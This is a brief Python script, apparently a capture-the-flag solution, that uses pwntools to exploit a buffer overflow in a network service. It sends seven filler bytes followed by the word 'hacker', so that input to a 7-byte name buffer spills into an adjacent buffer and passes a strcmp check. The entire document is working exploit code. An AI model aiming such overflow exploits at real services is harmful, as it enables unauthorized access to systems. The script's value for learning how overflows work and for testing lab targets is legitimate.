#!/usr/bin/env python3
# scanf("%s", name[7]) overflows into the adjacent buffer[10]; filling name then
# writing "hacker" lands "hacker" in buffer, satisfying strcmp(buffer,"hacker").
import sys, os
from pwn import remote, context
context.log_level='error'
HOST=os.environ.get('HOST', sys.argv[1] if len(sys.argv)>1 else '127.0.0.1')
PORT=int(os.environ.get('PORT', sys.argv[2] if len(sys.argv)>2 else 18001))
io=remote(HOST,PORT)
io.sendline(b"A"*7+b"hacker")
print(io.recvall(timeout=3).decode(errors='replace'))
